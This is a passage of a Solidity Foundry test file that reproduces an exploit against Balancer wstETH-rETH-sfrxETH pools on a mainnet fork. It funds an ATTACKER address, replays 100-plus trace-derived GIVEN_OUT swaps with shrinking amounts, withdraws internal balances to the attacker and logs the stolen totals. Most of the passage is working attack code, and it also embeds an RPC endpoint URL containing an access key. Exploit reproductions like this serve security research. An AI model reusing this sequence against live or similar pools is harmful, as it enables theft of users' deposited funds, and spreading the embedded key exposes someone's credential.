                });
            }

            if (internalBalances[3] > 0) {
                ops[opIndex] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(rswETH),
                    amount: internalBalances[3],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
            }

            VAULT.manageUserBalance(ops);
            console.log("Withdrawal completed!");
        }

        vm.stopPrank();

        (,uint256[] memory finalBalances,) = VAULT.getPoolTokens(POOL_ID_TRIPLE);

        console.log("FINAL STATE:");
        console.log("BPT:", finalBalances[0]);
        console.log("ezETH:", finalBalances[1] / 1e18, "ETH");
        console.log("weETH:", finalBalances[2] / 1e18, "ETH");
        console.log("rswETH:", finalBalances[3] / 1e18, "ETH");

        console.log("ATTACKER BALANCES:");
        console.log("BPT:", IERC20(TRIPLE_BPT).balanceOf(ATTACKER) / 1e18);
        console.log("ezETH:", IERC20(ezETH).balanceOf(ATTACKER) / 1e18, "ETH");
        console.log("weETH:", IERC20(weETH).balanceOf(ATTACKER) / 1e18, "ETH");
        console.log("rswETH:", IERC20(rswETH).balanceOf(ATTACKER) / 1e18, "ETH");

        console.log("Total swaps executed:", successCount);
        console.log("SUCCESS!");
    }

    function testQuadPool() public {
        vm.createSelectFork(
            "https://greatest-prettiest-shard.quiknode.pro/b88e7d9ece3886528f7341abb3eabffa655fdc9c",
            23717101
        );

        console.log("Pool: wstETH-rETH-sfrxETH (0x5aee1e99...0467)");

        (IERC20[] memory tokens, uint256[] memory initialBalances,) = VAULT.getPoolTokens(POOL_ID_QUAD);

        console.log("INITIAL STATE:");
        console.log("BPT:", initialBalances[0]);
        console.log("wstETH:", initialBalances[1] / 1e18, "ETH");
        console.log("sfrxETH:", initialBalances[2] / 1e18, "ETH");
        console.log("rETH:", initialBalances[3] / 1e18, "ETH");

        // Fund attacker with BPT
        deal(QUAD_BPT, ATTACKER, 10000 ether);

        vm.startPrank(ATTACKER);
        IERC20(QUAD_BPT).approve(address(VAULT), type(uint256).max);
        IERC20(wstETH).approve(address(VAULT), type(uint256).max);
        IERC20(sfrxETH).approve(address(VAULT), type(uint256).max);
        IERC20(rETH).approve(address(VAULT), type(uint256).max);

        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
            sender: ATTACKER,
            fromInternalBalance: false,
            recipient: payable(ATTACKER),
            toInternalBalance: true
        });

        // swaps from transaction trace
        ExactSwapData[112] memory swaps;

        swaps[0] = ExactSwapData({ tokenIn: QUAD_BPT, tokenOut: wstETH, amount: 698964958917799834, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[1] = ExactSwapData({ tokenIn: QUAD_BPT, tokenOut: sfrxETH, amount: 4935819392170067680, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[2] = ExactSwapData({ tokenIn: QUAD_BPT, tokenOut: rETH, amount: 776623513617677601, expectedIn: 0, indexIn: 0, indexOut: 3 });
        swaps[3] = ExactSwapData({ tokenIn: QUAD_BPT, tokenOut: wstETH, amount: 6989649589177998, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[4] = ExactSwapData({ tokenIn: QUAD_BPT, tokenOut: sfrxETH, amount: 49358193921700677, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[5] = ExactSwapData({ tokenIn: QUAD_BPT, tokenOut: rETH, amount: 7766235136176776, expectedIn: 0, indexIn: 0, indexOut: 3 });
        swaps[6] = ExactSwapData({ tokenIn: QUAD_BPT, tokenOut: wstETH, amount: 69896495891780, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[7] = ExactSwapData({ tokenIn: QUAD_BPT, tokenOut: sfrxETH, amount: 493581939217006, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[8] = ExactSwapData({ tokenIn: QUAD_BPT, tokenOut: rETH, amount: 77662351361768, expectedIn: 0, indexIn: 0, indexOut: 3 });
        swaps[9] = ExactSwapData({ tokenIn: QUAD_BPT, tokenOut: wstETH, amount: 698964958918, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[10] = ExactSwapData({ tokenIn: QUAD_BPT, tokenOut: sfrxETH, amount: 4935819392170, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[11] = ExactSwapData({ tokenIn: QUAD_BPT, tokenOut: rETH, amount: 776623513618, expectedIn: 0, indexIn: 0, indexOut: 3 });
        swaps[12] = ExactSwapData({ tokenIn: QUAD_BPT, tokenOut: wstETH, amount: 6989649589, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[13] = ExactSwapData({ tokenIn: QUAD_BPT, tokenOut: sfrxETH, amount: 49358193922, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[14] = ExactSwapData({ tokenIn: QUAD_BPT, tokenOut: rETH, amount: 7766235136, expectedIn: 0, indexIn: 0, indexOut: 3 });
        swaps[15] = ExactSwapData({ tokenIn: QUAD_BPT, tokenOut: wstETH, amount: 69896496, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[16] = ExactSwapData({ tokenIn: QUAD_BPT, tokenOut: sfrxETH, amount: 493581939, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[17] = ExactSwapData({ tokenIn: QUAD_BPT, tokenOut: rETH, amount: 77662351, expectedIn: 0, indexIn: 0, indexOut: 3 });
        swaps[18] = ExactSwapData({ tokenIn: QUAD_BPT, tokenOut: wstETH, amount: 698965, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[19] = ExactSwapData({ tokenIn: QUAD_BPT, tokenOut: sfrxETH, amount: 4935820, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[20] = ExactSwapData({ tokenIn: QUAD_BPT, tokenOut: rETH, amount: 776624, expectedIn: 0, indexIn: 0, indexOut: 3 });
        swaps[21] = ExactSwapData({ tokenIn: QUAD_BPT, tokenOut: wstETH, amount: 6990, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[22] = ExactSwapData({ tokenIn: QUAD_BPT, tokenOut: sfrxETH, amount: 49358, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[23] = ExactSwapData({ tokenIn: QUAD_BPT, tokenOut: rETH, amount: 7766, expectedIn: 0, indexIn: 0, indexOut: 3 });
        swaps[24] = ExactSwapData({ tokenIn: QUAD_BPT, tokenOut: wstETH, amount: 71, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[25] = ExactSwapData({ tokenIn: QUAD_BPT, tokenOut: sfrxETH, amount: 494, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[26] = ExactSwapData({ tokenIn: QUAD_BPT, tokenOut: rETH, amount: 79, expectedIn: 0, indexIn: 0, indexOut: 3 });
        swaps[27] = ExactSwapData({ tokenIn: QUAD_BPT, tokenOut: sfrxETH, amount: 5, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[28] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 19999999995, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[29] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[30] = ExactSwapData({ tokenIn: wstETH, tokenOut: sfrxETH, amount: 87000000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[31] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 8856, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[32] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[33] = ExactSwapData({ tokenIn: wstETH, tokenOut: sfrxETH, amount: 62000000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[34] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 17090, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[35] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[36] = ExactSwapData({ tokenIn: wstETH, tokenOut: sfrxETH, amount: 44000000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[37] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 10095, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[38] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[39] = ExactSwapData({ tokenIn: wstETH, tokenOut: sfrxETH, amount: 31000000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[40] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 2996, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[41] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[42] = ExactSwapData({ tokenIn: wstETH, tokenOut: sfrxETH, amount: 22000000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[43] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 3034, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[44] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[45] = ExactSwapData({ tokenIn: wstETH, tokenOut: sfrxETH, amount: 15000000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[46] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 249, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[47] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[48] = ExactSwapData({ tokenIn: wstETH, tokenOut: sfrxETH, amount: 11000000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[49] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 1049, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[50] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[51] = ExactSwapData({ tokenIn: wstETH, tokenOut: sfrxETH, amount: 8000000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[52] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 70398, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[53] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[54] = ExactSwapData({ tokenIn: wstETH, tokenOut: sfrxETH, amount: 5400000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[55] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 65940, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[56] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[57] = ExactSwapData({ tokenIn: wstETH, tokenOut: sfrxETH, amount: 3800000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[58] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 2012, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[59] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[60] = ExactSwapData({ tokenIn: wstETH, tokenOut: sfrxETH, amount: 2700000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[61] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 2487, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[62] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[63] = ExactSwapData({ tokenIn: wstETH, tokenOut: sfrxETH, amount: 1900000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[64] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 749, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[65] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[66] = ExactSwapData({ tokenIn: wstETH, tokenOut: sfrxETH, amount: 1300000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[67] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 155, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[68] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[69] = ExactSwapData({ tokenIn: wstETH, tokenOut: sfrxETH, amount: 990000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[70] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 9764, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[71] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[72] = ExactSwapData({ tokenIn: wstETH, tokenOut: sfrxETH, amount: 730000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[73] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 3212, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[74] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[75] = ExactSwapData({ tokenIn: wstETH, tokenOut: sfrxETH, amount: 520000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[76] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 1092, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[77] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[78] = ExactSwapData({ tokenIn: wstETH, tokenOut: sfrxETH, amount: 370000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[79] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 781, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[80] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[81] = ExactSwapData({ tokenIn: wstETH, tokenOut: sfrxETH, amount: 270000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[82] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 1224, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[83] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[84] = ExactSwapData({ tokenIn: wstETH, tokenOut: sfrxETH, amount: 180000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[85] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 1935, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[86] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[87] = ExactSwapData({ tokenIn: wstETH, tokenOut: sfrxETH, amount: 130000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[88] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 84, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[89] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[90] = ExactSwapData({ tokenIn: wstETH, tokenOut: sfrxETH, amount: 97000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[91] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 593, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[92] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[93] = ExactSwapData({ tokenIn: wstETH, tokenOut: sfrxETH, amount: 75000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[94] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 331, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[95] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[96] = ExactSwapData({ tokenIn: wstETH, tokenOut: sfrxETH, amount: 54000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[97] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 360, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[98] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[99] = ExactSwapData({ tokenIn: wstETH, tokenOut: sfrxETH, amount: 34200000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[100] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 19, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[101] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: wstETH, amount: 4, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[102] = ExactSwapData({ tokenIn: wstETH, tokenOut: sfrxETH, amount: 27000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[103] = ExactSwapData({ tokenIn: wstETH, tokenOut: QUAD_BPT, amount: 10000, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[104] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: QUAD_BPT, amount: 10000000, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[105] = ExactSwapData({ tokenIn: rETH, tokenOut: QUAD_BPT, amount: 10000000000, expectedIn: 0, indexIn: 3, indexOut: 0 });
        swaps[106] = ExactSwapData({ tokenIn: wstETH, tokenOut: QUAD_BPT, amount: 10000000000000, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[107] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: QUAD_BPT, amount: 10000000000000000, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[108] = ExactSwapData({ tokenIn: rETH, tokenOut: QUAD_BPT, amount: 2257356215128872610, expectedIn: 0, indexIn: 3, indexOut: 0 });
        swaps[109] = ExactSwapData({ tokenIn: wstETH, tokenOut: QUAD_BPT, amount: 2257356215128872610, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[110] = ExactSwapData({ tokenIn: sfrxETH, tokenOut: QUAD_BPT, amount: 2257356215128872610, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[111] = ExactSwapData({ tokenIn: wstETH, tokenOut: rETH, amount: 370000000000000000, expectedIn: 0, indexIn: 1, indexOut: 3 });


        console.log("Executing swaps...");
        uint256 successCount = 0;

        for (uint i = 0; i < swaps.length; i++) {
            IBalancerVault.SingleSwap memory swap = IBalancerVault.SingleSwap({
                poolId: POOL_ID_QUAD,
                kind: IBalancerVault.SwapKind.GIVEN_OUT,
                assetIn: IAsset(swaps[i].tokenIn),
                assetOut: IAsset(swaps[i].tokenOut),
                amount: swaps[i].amount,
                userData: ""
            });

            try VAULT.swap(swap, funds, type(uint256).max, block.timestamp + 3600) {
                successCount++;
            } catch {
                // Continue on failure
            }
        }

        console.log("Swaps executed:", successCount, "/", swaps.length);

        // Withdrawal via manageUserBalance
        IERC20[] memory internalTokens = new IERC20[](4);
        internalTokens[0] = IERC20(QUAD_BPT);
        internalTokens[1] = IERC20(wstETH);
        internalTokens[2] = IERC20(sfrxETH);
        internalTokens[3] = IERC20(rETH);

        uint256[] memory internalBalances = VAULT.getInternalBalance(ATTACKER, internalTokens);

        console.log("Internal balances:");
        console.log("  BPT:", internalBalances[0] / 1e18, "ETH");
        console.log("  wstETH:", internalBalances[1] / 1e18, "ETH");
        console.log("  sfrxETH:", internalBalances[2] / 1e18, "ETH");
        console.log("  rETH:", internalBalances[3] / 1e18, "ETH");

        if (internalBalances[0] > 0 || internalBalances[1] > 0 || internalBalances[2] > 0 || internalBalances[3] > 0) {
            uint256 opsCount = 0;
            if (internalBalances[0] > 0) opsCount++;
            if (internalBalances[1] > 0) opsCount++;
            if (internalBalances[2] > 0) opsCount++;
            if (internalBalances[3] > 0) opsCount++;

            IBalancerVault.UserBalanceOp[] memory ops = new IBalancerVault.UserBalanceOp[](opsCount);
            uint256 opIndex = 0;

            if (internalBalances[0] > 0) {
                ops[opIndex++] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(QUAD_BPT),
                    amount: internalBalances[0],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
            }

            if (internalBalances[1] > 0) {
                ops[opIndex++] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(wstETH),
                    amount: internalBalances[1],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
            }

            if (internalBalances[2] > 0) {
                ops[opIndex++] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(sfrxETH),
                    amount: internalBalances[2],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
            }

            if (internalBalances[3] > 0) {
                ops[opIndex] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(rETH),
                    amount: internalBalances[3],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
            }

            VAULT.manageUserBalance(ops);
            console.log("Withdrawal completed!");
        }

        vm.stopPrank();

        (,uint256[] memory finalBalances,) = VAULT.getPoolTokens(POOL_ID_QUAD);

        console.log("FINAL STATE:");
        console.log("BPT:", finalBalances[0]);
        console.log("wstETH:", finalBalances[1] / 1e18, "ETH");
        console.log("sfrxETH:", finalBalances[2] / 1e18, "ETH");
        console.log("rETH:", finalBalances[3] / 1e18, "ETH");

        console.log("ATTACKER BALANCES:");
        console.log("BPT:", IERC20(QUAD_BPT).balanceOf(ATTACKER) / 1e18);
        console.log("wstETH:", IERC20(wstETH).balanceOf(ATTACKER) / 1e18, "ETH");
        console.log("sfrxETH:", IERC20(sfrxETH).balanceOf(ATTACKER) / 1e18, "ETH");
        console.log("rETH:", IERC20(rETH).balanceOf(ATTACKER) / 1e18, "ETH");

        console.log("Total swaps executed:", successCount);
        console.log("SUCCESS!");
    }

    function testQuad2Pool() public {
        vm.createSelectFork("https://greatest-prettiest-shard.quiknode.pro/b88e7d9ece3886528f7341abb3eabffa655fdc9c", 23717101);

        console.log("Pool: wstETH-rETH-sfrxETH #2 (0x42ed016f...058b)");

        (IERC20[] memory tokens, uint256[] memory initialBalances,) = VAULT.getPoolTokens(POOL_ID_QUAD2);
        console.log("INITIAL STATE:");
        console.log("BPT:", initialBalances[0]);
        console.log("wstETH:", initialBalances[1] / 1e18, "ETH");
        console.log("sfrxETH:", initialBalances[2] / 1e18, "ETH");
        console.log("rETH:", initialBalances[3] / 1e18, "ETH");
        deal(QUAD2_BPT, ATTACKER, 10000 ether);
        vm.startPrank(ATTACKER);
        IERC20(QUAD2_BPT).approve(address(VAULT), type(uint256).max);
        IERC20(wstETH).approve(address(VAULT), type(uint256).max);
        IERC20(sfrxETH).approve(address(VAULT), type(uint256).max);
        IERC20(rETH).approve(address(VAULT), type(uint256).max);
        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
            sender: ATTACKER, fromInternalBalance: false, recipient: payable(ATTACKER), toInternalBalance: true
        });
        ExactSwapData[132] memory swaps;

        swaps[0] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: wstETH, amount: 189859709496896175117, expectedIn: 0, indexIn: 0, indexOut: 1});
        swaps[1] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: sfrxETH, amount: 2126762756848096771871, expectedIn: 0, indexIn: 0, indexOut: 2});
        swaps[2] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: rETH, amount: 218562291361368816286, expectedIn: 0, indexIn: 0, indexOut: 3});
        swaps[3] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: wstETH, amount: 1898597094968961751, expectedIn: 0, indexIn: 0, indexOut: 1});
        swaps[4] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: sfrxETH, amount: 21267627568480967719, expectedIn: 0, indexIn: 0, indexOut: 2});
        swaps[5] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: rETH, amount: 2185622913613688163, expectedIn: 0, indexIn: 0, indexOut: 3});
        swaps[6] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: wstETH, amount: 18985970949689617, expectedIn: 0, indexIn: 0, indexOut: 1});
        swaps[7] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: sfrxETH, amount: 212676275684809677, expectedIn: 0, indexIn: 0, indexOut: 2});
        swaps[8] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: rETH, amount: 21856229136136882, expectedIn: 0, indexIn: 0, indexOut: 3});
        swaps[9] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: wstETH, amount: 189859709496897, expectedIn: 0, indexIn: 0, indexOut: 1});
        swaps[10] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: sfrxETH, amount: 2126762756848097, expectedIn: 0, indexIn: 0, indexOut: 2});
        swaps[11] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: rETH, amount: 218562291361368, expectedIn: 0, indexIn: 0, indexOut: 3});
        swaps[12] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: wstETH, amount: 1898597094968, expectedIn: 0, indexIn: 0, indexOut: 1});
        swaps[13] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: sfrxETH, amount: 21267627568481, expectedIn: 0, indexIn: 0, indexOut: 2});
        swaps[14] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: rETH, amount: 2185622913614, expectedIn: 0, indexIn: 0, indexOut: 3});
        swaps[15] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: wstETH, amount: 18985970950, expectedIn: 0, indexIn: 0, indexOut: 1});
        swaps[16] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: sfrxETH, amount: 212676275685, expectedIn: 0, indexIn: 0, indexOut: 2});
        swaps[17] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: rETH, amount: 21856229136, expectedIn: 0, indexIn: 0, indexOut: 3});
        swaps[18] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: wstETH, amount: 189859710, expectedIn: 0, indexIn: 0, indexOut: 1});
        swaps[19] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: sfrxETH, amount: 2126762756, expectedIn: 0, indexIn: 0, indexOut: 2});
        swaps[20] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: rETH, amount: 218562292, expectedIn: 0, indexIn: 0, indexOut: 3});
        swaps[21] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: wstETH, amount: 1898597, expectedIn: 0, indexIn: 0, indexOut: 1});
        swaps[22] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: sfrxETH, amount: 21267628, expectedIn: 0, indexIn: 0, indexOut: 2});
        swaps[23] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: rETH, amount: 2185623, expectedIn: 0, indexIn: 0, indexOut: 3});
        swaps[24] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: wstETH, amount: 18986, expectedIn: 0, indexIn: 0, indexOut: 1});
        swaps[25] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: sfrxETH, amount: 212676, expectedIn: 0, indexIn: 0, indexOut: 2});
        swaps[26] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: rETH, amount: 21856, expectedIn: 0, indexIn: 0, indexOut: 3});
        swaps[27] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: wstETH, amount: 190, expectedIn: 0, indexIn: 0, indexOut: 1});
        swaps[28] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: sfrxETH, amount: 2127, expectedIn: 0, indexIn: 0, indexOut: 2});
        swaps[29] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: rETH, amount: 218, expectedIn: 0, indexIn: 0, indexOut: 3});
        swaps[30] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: wstETH, amount: 2, expectedIn: 0, indexIn: 0, indexOut: 1});
        swaps[31] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: sfrxETH, amount: 22, expectedIn: 0, indexIn: 0, indexOut: 2});
        swaps[32] = ExactSwapData({tokenIn: QUAD2_BPT, tokenOut: rETH, amount: 3, expectedIn: 0, indexIn: 0, indexOut: 3});
        swaps[33] = ExactSwapData({tokenIn: sfrxETH, tokenOut: wstETH, amount: 49999999995, expectedIn: 0, indexIn: 2, indexOut: 1});
